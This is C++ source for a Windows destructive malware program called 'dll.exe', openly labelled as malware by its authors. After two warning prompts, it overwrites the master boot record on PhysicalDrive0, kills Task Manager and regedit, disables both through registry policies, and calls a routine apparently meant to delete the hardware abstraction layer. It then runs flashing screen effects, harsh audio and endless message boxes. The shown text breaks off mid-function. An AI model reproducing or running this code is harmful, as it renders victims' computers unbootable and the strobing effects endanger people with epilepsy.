// dll.exe by Tubercomi and Venra
// WARNING: it's destructive
// RaduMinecraft gave us permission to use the cube from his Solaris!

#include <windows.h>
#include <cmath>
#include "boot.hpp"
#include "haldelete.hpp"
#define Tau 6.283185307178
#define NOTSRCINVERT (DWORD)0x999999

VOID WINAPI Refresh() {
	InvalidateRect(0, 0, 0);
}

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD{
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE unused;
	};
}*PRGBQUAD;

static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

double intensity = 0.0;
bool state = false;
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}


struct Point3D {
    float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    SelectObject(hdc, brush);
    DrawIcon(hdc, x - 20, y - 20, LoadCursor(NULL, IDC_ARROW));  // Draw an ellipse with 50x50 size
    DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = sin(angleX);
    float cosY = cos(angleY), sinY = sin(angleY);
    float cosZ = cos(angleZ), sinZ = sin(angleZ);

    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y;
    point.z = z;

    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x;
    point.z = z;

    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x;
    point.y = y;

    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };

    POINT screenPoints[8];

    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        COLORREF color = COLORHSL(colorA);

        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);

        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;

        DrawEllipseAt(hdc, screenX, screenY, color);
    }

    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);

    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);

    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}



;VOID WINAPI DisableSystemTools() {
	system("taskkill /f /im taskmgr.exe");
	system("taskkill /f /im regedit.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f");
}

VOID WINAPI TerminateWindowsShell() {
	system("taskkill /f /im explorer.exe");
}

VOID WINAPI TerminatePayload(HANDLE hnd) {
	TerminateThread(hnd, 0);
	CloseHandle(hnd);
}

VOID WINAPI BootPayload() {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, bootloader, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}

DWORD WINAPI StretchBlt1(LPVOID lps)
{
	HDC hDC;
	int ScreenWidth, ScreenHeight;
   while (1) {
      hDC = GetDC(0);
      ScreenWidth = GetSystemMetrics(0);
      ScreenHeight = GetSystemMetrics(1);
      SetStretchBltMode(hDC, HALFTONE);
      StretchBlt(hDC, 1, 1, ScreenWidth + 5, ScreenHeight + 3, hDC, 0, 0, ScreenWidth, ScreenHeight, SRCPAINT);
      StretchBlt(hDC, -1, -1, ScreenWidth - 2, ScreenHeight - 2, hDC, 0, 0, ScreenWidth, ScreenHeight, SRCERASE);
      ReleaseDC(NULL, hDC);
   }
}

VOID WINAPI SoundEffect1() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t^((t&t>>8)-t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI BitBlt1(LPVOID lBit)
{
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		for (int angle = 0; angle < 361; angle++) {
			int x = 100 * tan(angle * M_PI / 0.41), y = 100 * sin(angle * M_PI / 0.50);
			BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, NOTSRCERASE);
			Sleep(0.5);
		}
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI Rectangle1(LPVOID lbnc)
{
	int width = GetSystemMetrics(0), height = GetSystemMetrics(1);
	int BounceFactorX = 1;
    int BounceFactorY = 1;
    int BounceFactorWidth = 1;
    int BounceFactorHeight = 1;
    int ShapeBounce = 10;
    int x = 10;
    int y = 10;
    COLORREF red = RGB(200, 0, 0);
	while(1){
		HDC hDC = GetDC(0);
        x += ShapeBounce * BounceFactorX;
        y += ShapeBounce * BounceFactorY;
		int SquareLeft = 0 + x;
        int SquareRight = 0 + y;
        int SquareBottom = 100 + x;
        int SquareTop = 100 + y; 
    	HBRUSH ShapeFillClr = CreateSolidBrush(red);
    	SelectObject(hDC, ShapeFillClr);
		Rectangle(hDC, SquareLeft, SquareRight, SquareBottom, SquareTop);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                BounceFactorY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            BounceFactorX = -1;
        }
        if (y == 0)
        {
            BounceFactorY = 1;
        }
        if (x == 0)
        {
            BounceFactorX = 1;
        }
        Sleep(10);
    	DeleteObject(ShapeFillClr);
        ReleaseDC(0, hDC);
	}
}

VOID WINAPI SoundEffect2() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11015, 11015, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11015 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t^(t*(t>>5)-t|t>>7));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI BitBlt2(LPVOID lBit)
{
  HDC hDC = GetDC(NULL); HWND hWindow = GetDesktopWindow();
  int Width = GetSystemMetrics(0), Height = GetSystemMetrics(1);
  double WaveAngle = 0;
  while (true) {
    hDC = GetDC(0);
    for (float i = 0; i < Width + Height; i += 0.99f) {
      int a = tan(WaveAngle) * 20;
      BitBlt(hDC, 0, i, Width, 1, hDC, a, i, NOTSRCERASE);
      WaveAngle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(hWindow, hDC);
    DeleteDC(hDC); DeleteObject(&Width); DeleteObject(&Height); DeleteObject(&WaveAngle);
  }
}

DWORD WINAPI Tesseract1(LPVOID lcube)
{
    int signX = 1;
    int signY = 1;
    int incrementor = 5;
    float x2 = 100.0f;
    float y2 = 100.0f;
    float angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f;
    float angleIncrement = 0.05f;
    float colorA = 0;
    float size = 0.0f;

    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);

        x2 += incrementor * signX;
        y2 += incrementor * signY;

        if (x2 + 75 >= x) {
            signX = -1;
            x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1;
            x2 = 76;
        }

        if (y2 + 75 >= y) {
            signY = -1;
            y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1;
            y2 = 76;
        }

        Point3D center = { x2, y2, 0.0f };
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;

		Sleep(10);

        ReleaseDC(0, hdc);
        colorA += 1;

        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }

    return 0;
}

VOID WINAPI SoundEffect3() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16001, 16001, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16001 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t>>4*t|(t-9|10)*t>>9)^t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI PRGBQUAD1(LPVOID lrgb)
{
	HDC hDC = GetDC(0), hDCSource = CreateCompatibleDC(hDC);
	INT Width = GetSystemMetrics(0), Height = GetSystemMetrics(1);
	BITMAPINFO BitmapInfo = { 0 };
	PRGBQUAD PRGBScreen = { 0 };
	BitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFO);
	BitmapInfo.bmiHeader.biBitCount = 32;
	BitmapInfo.bmiHeader.biPlanes = 1;
	BitmapInfo.bmiHeader.biWidth = Width;
	BitmapInfo.bmiHeader.biHeight = Height;
	HBITMAP BitmapTemporary = CreateDIBSection(hDC, &BitmapInfo, NULL, (void**)&PRGBScreen, NULL, NULL);
	SelectObject(hDCSource, BitmapTemporary);
	for (;;) {
		hDC = GetDC(0);
		BitBlt(hDCSource, 0, 0, Width, Height, hDC, 0, 0, SRCCOPY);
		for (INT i = 0; i < Width * Height; i++) {
			INT x = i % Width, y = i * Width;
			PRGBScreen[i].rgb += (x^y);
		}
		BitBlt(hDC, 0, 0, Width, Height, hDCSource, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hDC); DeleteDC(hDC);
	}
}

VOID WINAPI SoundEffect4() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11020, 11020, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11020 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t/(t>>8|t>>1)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI PRGBTRIPLE1(LPVOID lpt)
{
	HDC hDesktop = GetDC(0), hDesktopMemory = CreateCompatibleDC(hDesktop);
	INT Width = GetSystemMetrics(0), Height = GetSystemMetrics(1);
	BITMAPINFO BitmapInfo = { 0 };
	PRGBQUAD PRGBScreen = { 0 };
	BitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFO);
	BitmapInfo.bmiHeader.biBitCount = 32;
	BitmapInfo.bmiHeader.biPlanes = 1;
	BitmapInfo.bmiHeader.biWidth = Width;
	BitmapInfo.bmiHeader.biHeight = Height;
	HBITMAP BitmapTemp = CreateDIBSection(hDesktop, &BitmapInfo, NULL, (void**)&PRGBScreen, NULL, NULL);
	SelectObject(hDesktopMemory, BitmapTemp);
	for (;;) {
		hDesktop = GetDC(0);
		BitBlt(hDesktopMemory, 0, 0, Width, Height, hDesktop, 0, 0, SRCCOPY);
		for (INT i = 0; i < Width * Height; i++) {
			//INT x = i % Width, y = i / Width;
			PRGBScreen[i].rgb -= i * Width ^ Height;
		}
		BitBlt(hDesktop, 0, 0, Width, Height, hDesktopMemory, 0, 0, SRCCOPY);
		BitBlt(hDesktop, -2, 30 * sin(M_PI / 50), Width, Height, hDesktopMemory, 2 * M_PI / 8.f, 3, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hDesktop); DeleteDC(hDesktop);
	}
}

VOID WINAPI SoundEffect5() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11020, 11020, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11020 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t&t>>6)+(t&t>>9))-t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI SoundEffect6() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16001, 16001, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16001 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t*(42&t>>10))%255+(t*(42&t>>10))%127)+(t|t%255|t%257)+(t&t>>8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI BitBlt3(LPVOID lBit)
{
  HDC hDesktop = GetDC(0); HWND hWindow = GetDesktopWindow();
  int ScreenWidth = GetSystemMetrics(0), ScreenHeight = GetSystemMetrics(1);
  double LogAngle = 0;
  while (1) {
    hDesktop = GetDC(0);
    for (float i = 0; i < ScreenWidth + ScreenHeight; i += 0.99f) {
      int LogWaveCoreValue = log2(LogAngle) * 20;
      BitBlt(hDesktop, 0, i, ScreenWidth, 1, hDesktop, LogWaveCoreValue, i, SRCERASE);
      LogAngle += M_PI / 80;
      DeleteObject(&i); DeleteObject(&LogWaveCoreValue);
    }
    ReleaseDC(hWindow, hDesktop);
    DeleteDC(hDesktop); DeleteObject(&ScreenWidth); DeleteObject(&ScreenHeight); DeleteObject(&LogAngle);
  }
}

DWORD WINAPI Pixelation(LPVOID lp)
{
	HDC hDesktop = GetDC(0);
	HDC hCompatibleDesktop = CreateCompatibleDC(hDesktop);
	int Width = GetSystemMetrics(0);
	int Height = GetSystemMetrics(1);
	HBITMAP Bitmap = CreateCompatibleBitmap(hDesktop, Width, Height);
	SelectObject(hCompatibleDesktop, Bitmap);
	while (true)
	{
		hDesktop = GetDC(NULL);
		SetStretchBltMode(hCompatibleDesktop, COLORONCOLOR);
		SetStretchBltMode(hDesktop, COLORONCOLOR);

		StretchBlt(hCompatibleDesktop, 0, 0, Width / 3, Height / 3, hDesktop, 0, 0, Width, Height, SRCCOPY);
		StretchBlt(hDesktop, 0, 0, Width, Height, hCompatibleDesktop, 0, 0, Width / 3, Height / 3, SRCINVERT);
		ReleaseDC(0, hDesktop);
		Sleep(10);
	}
}

VOID WINAPI SoundEffect7() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t&t>>12)*(t>>4|t>>8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI NeuroFunk() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 33] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t&4096?t%65536<59392?7:t&7:16)+(1&t>>14))>>(3&-t>>(t&2048?2:10)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}


DWORD WINAPI LoadCursor1(LPVOID lCur)
{
	while (true) {
		HDC hDesktop = GetDC(NULL);
		int IconWidth = GetSystemMetrics(SM_CXSCREEN);
		int IconHeight = GetSystemMetrics(SM_CYSCREEN);
		DrawIconEx(hDesktop, rand() % IconWidth, rand() % IconHeight, LoadCursor(NULL, IDC_ARROW), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), NULL, NULL, DI_NORMAL);
		DrawIconEx(hDesktop, rand() % IconWidth, rand() % IconHeight, LoadCursor(NULL, IDC_UPARROW), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), NULL, NULL, DI_NORMAL);
		DrawIconEx(hDesktop, rand() % IconWidth, rand() % IconHeight, LoadCursor(NULL, IDC_CROSS), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), NULL, NULL, DI_NORMAL);
		DrawIconEx(hDesktop, rand() % IconWidth, rand() % IconHeight, LoadCursor(NULL, IDC_NO), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), NULL, NULL, DI_NORMAL);
		DrawIconEx(hDesktop, rand() % IconWidth, rand() % IconHeight, LoadCursor(NULL, IDC_HAND), (rand() % 5 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 5 + 1) * GetSystemMetrics(SM_CYICON), NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hDesktop);
		Sleep(1);
	}
}

DWORD WINAPI PRGBPat(LPVOID lPRGB)
{
	HDC hDesktopScr = GetDC(NULL), hDesktopMem = CreateCompatibleDC(hDesktopScr);
	INT Width = GetSystemMetrics(SM_CXSCREEN), Height = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO BitmapInfo = { 0 };
	PRGBQUAD PRGBScreen = { 0 };
	BitmapInfo.bmiHeader.biSize = sizeof(BITMAPINFO);
	BitmapInfo.bmiHeader.biBitCount = 32;
	BitmapInfo.bmiHeader.biPlanes = 1;
	BitmapInfo.bmiHeader.biWidth = Width;
	BitmapInfo.bmiHeader.biHeight = Height;
	HBITMAP hBitmapTemporary = CreateDIBSection(hDesktopScr, &BitmapInfo, NULL, (void**)&PRGBScreen, NULL, NULL);
	SelectObject(hDesktopMem, hBitmapTemporary);
	for (;;) {
		hDesktopScr = GetDC(NULL);
		BitBlt(hDesktopMem, 0, 0, Width, Height, hDesktopScr, 0, 0, SRCCOPY);
		for (INT i = 0; i < Width * Height; i++) {
			//INT x = i % Width, y = i / Width;
			PRGBScreen[i].rgb -= (Width*Height);
		}
		BitBlt(hDesktopScr, 0, 0, Width, Height, hDesktopMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hDesktopScr); DeleteDC(hDesktopScr);
	}
}

VOID WINAPI SoundEffect8() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t>>5|t)>>(t>>16)%8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI TauWaves(LPVOID lpta)
{
	int ScrWidth = GetSystemMetrics(SM_CXSCREEN), ScrHeight = GetSystemMetrics(SM_CYSCREEN), SizeWidthVal = ScrHeight / 10, SizeHeightVal = 9;
	while (1) {
		HDC hDesktop = GetDC(0);
		for (int i = 0; i < ScrWidth * 5; i++) {
			int LogTauWaves = log(i / ((float)SizeWidthVal) * Tau) * (SizeHeightVal);
			BitBlt(hDesktop, 0, i, ScrWidth * Tau, 1, hDesktop, LogTauWaves, i, NOTSRCINVERT);
		}
		if ((rand() % 100 + 1) % 67 == 0);
		ReleaseDC(0, hDesktop);
	}
}

VOID WINAPI SoundEffect9() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2*sin(t&t>>5|t&t>>9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI MessageBox1(LPVOID msg)
{
	while (true) {
		MessageBoxA(NULL, "", "", MB_ABORTRETRYIGNORE);
	}
}

DWORD WINAPI RoundRectRgnInvert1(LPVOID lR)
{
    int Width;
    int Height;
    HDC hDesktop;
    HRGN hRegion;
    
    while (true) {
        hDesktop = GetDC(NULL);
        Width = GetSystemMetrics(0), Height = GetSystemMetrics(1);
        hRegion = CreateRoundRectRgn(rand () % Width, rand () % Height, rand () % Width, rand () % Height, 30, 30);
        InvertRgn(hDesktop, hRegion);
        DeleteObject(hRegion);
        ReleaseDC(NULL, hDesktop);
        Sleep(10);
    }
}

DWORD WINAPI Statik(LPVOID lSt)
{
    int Ticks = GetTickCount();
    int Width = GetSystemMetrics(0), Height = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (Width * Height + Width) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC hDesktop = GetDC(NULL);
        HDC hMemory = CreateCompatibleDC(hDesktop);
        HBITMAP Bitmap = CreateBitmap(Width, Height, 1, 32, data);
        SelectObject(hMemory, Bitmap);
        BitBlt(hMemory, 0, 0, Width, Height, hDesktop, 0, 0, SRCERASE);
        GetBitmapBits(Bitmap, 4 * Height * Width, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - Ticks) > 10)
            byte = randy()%0xff;
        for (int i = 0; Width * Height > i; ++i) {
            if (!(i % Height) && !(randy() % 110))
                v = randy() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(Bitmap, Width * Height * 4, data);
        BitBlt(hDesktop, 0, 0, Width, Height, hMemory, 0, 0, SRCERASE);
        DeleteObject(Bitmap);
        DeleteObject(hMemory);
        DeleteObject(hDesktop);
    }
    return 0;
} 

VOID WINAPI Noise() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 34000, 34000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[34000 * 3] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int CALLBACK WinMain(HINSTANCE hinst, HINSTANCE minst, LPSTR lps, int i) {
	if (MessageBoxA(NULL, "This is a Malware, Run?", "dll by Tubercomiosis and Venra: FIRST WARNING!", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL | MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	else
	{
		if (MessageBoxA(NULL, "Are you sure? It will destroy your MBR and it contains flashing lights - NOT for epilepsy", "dll.exe: LAST WARNING BEFORE YOUR COMPUTER'S DEATH!", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL | MB_DEFBUTTON2) == IDNO)
		{
			return 0;
		}
		else
		{
			BootPayload();
			DisableSystemTools();
			DeleteWindowsAbstLayer();
			Sleep(5000);
			HANDLE object = CreateThread(0, 0, MessageBox1, 0, 0, 0);
			Sleep(1000);
			HANDLE a = CreateThread(0, 0, StretchBlt1, 0, 0, 0);
			SoundEffect1();
			Sleep(30000);
			TerminatePayload(a);
			Refresh();
			
			Sleep(1000);
			HANDLE b = CreateThread(0, 0, BitBlt1, 0, 0, 0);
			HANDLE bb = CreateThread(0, 0, Rectangle1, 0, 0, 0);
			SoundEffect2();
			Sleep(30000);
			TerminatePayload(b);
			TerminatePayload(bb);
			Refresh();
			Sleep(1000);
			HANDLE c = CreateThread(0, 0, BitBlt2, 0, 0, 0);
			HANDLE cursorcube = CreateThread(0, 0, Tesseract1, 0, 0, 0);
			SoundEffect3();
			Sleep(30000);
			TerminatePayload(c);
			Refresh();
			Sleep(1000);
			HANDLE d = CreateThread(0, 0, PRGBQUAD1, 0, 0, 0);
			SoundEffect4();
			Sleep(30000);
			TerminatePayload(d);
			Refresh();
			Sleep(1000);
			HANDLE e = CreateThread(0, 0, PRGBTRIPLE1, 0, 0, 0);
			SoundEffect5();
			Sleep(30000);
			TerminatePayload(e);
			Refresh();
			Sleep(1000);
			HANDLE f = CreateThread(0, 0, BitBlt3, 0, 0, 0);
			SoundEffect6();
			Sleep(30000);
			TerminatePayload(f);
			Refresh();
			Sleep(1000);
			HANDLE g = CreateThread(0, 0, Pixelation, 0, 0, 0);
			SoundEffect7();
			Sleep(30000);
			TerminatePayload(g);
